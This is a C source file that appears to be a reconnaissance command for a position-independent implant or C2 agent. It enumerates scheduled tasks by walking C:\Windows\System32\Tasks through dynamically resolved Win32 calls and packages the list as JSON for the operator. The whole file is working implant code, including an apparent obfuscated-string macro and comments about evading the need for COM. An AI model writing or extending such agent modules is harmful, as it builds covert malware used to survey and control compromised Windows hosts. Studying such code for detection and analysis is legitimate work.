#include "config.h"
#ifdef INCLUDE_CMD_TASKS

#include "commands.h"
#include "json_out.h"

// Enumerate registered scheduled tasks by walking C:\Windows\System32\Tasks.
// Task Scheduler COM (ITaskService) is out of reach for a PIC agent; the task
// XML files on disk are the authoritative store for all modern (Vista+)
// scheduled tasks. Depth-limited walk: root -> vendor folder -> task file.

typedef struct _TASK_LIST {
    char  names[96][280];
    DWORD count;
} TASK_LIST;

static TASK_LIST g_tl;

static void tl_add(const char* full, const char* base_len) {
    if (g_tl.count >= 96) return;
    char* dst = g_tl.names[g_tl.count];
    int k = 0;
    for (; full[k] && k < 270; k++) dst[k] = full[k];
    dst[k] = 0;
    g_tl.count++;
}

static void tl_walk(PINSTANCE inst, const char* dir, int depth) {
    if (depth > 2) return;
    char pattern[300];
    int n = 0;
    for (; dir[n] && n < 290; n++) pattern[n] = dir[n];
    if (n && pattern[n-1] != '\\') pattern[n++] = '\\';
    pattern[n++] = '*'; pattern[n] = 0;

    WIN32_FIND_DATAA fd;
    HANDLE h = inst->Win32.FindFirstFileA(pattern, &fd);
    if (h == INVALID_HANDLE_VALUE) return;
    do {
        if (fd.cFileName[0] == '.') continue;
        char full[300];
        int n = 0;
        for (; dir[n] && n < 290; n++) full[n] = dir[n];
        if (n && full[n-1] != '\\') full[n++] = '\\';
        for (int k = 0; fd.cFileName[k] && n < 298; k++) full[n++] = fd.cFileName[k];
        full[n] = 0;

        if (fd.dwFileAttributes & 0x10 /*FILE_ATTRIBUTE_DIRECTORY*/) {
            tl_walk(inst, full, depth + 1);
        } else {
            tl_add(full, fd.cFileName);
        }
    } while (inst->Win32.FindNextFileA(h, &fd));
    inst->Win32.FindClose(h);
}

VOID cmd_tasks(PINSTANCE inst, PPARSER args, PPACKAGE response) {
    g_tl.count = 0;
    xstr(_tasks_dir, "C:\\Windows\\System32\\Tasks");
    tl_walk(inst, _tasks_dir, 0);

    JSON_BUF jb;
    j_init(&jb);
    j_append_raw(&jb, "{\"tasks\":[");
    for (DWORD i = 0; i < g_tl.count; i++) {
        if (i) j_append_raw(&jb, ",");
        j_append_str(&jb, g_tl.names[i]);
    }
    j_append_raw(&jb, "],\"count\":");
    j_append_uint(&jb, g_tl.count);
    j_append_raw(&jb, "}");
    package_add_bytes(inst, response, (BYTE*)jb.buf, jb.len);
}

#endif
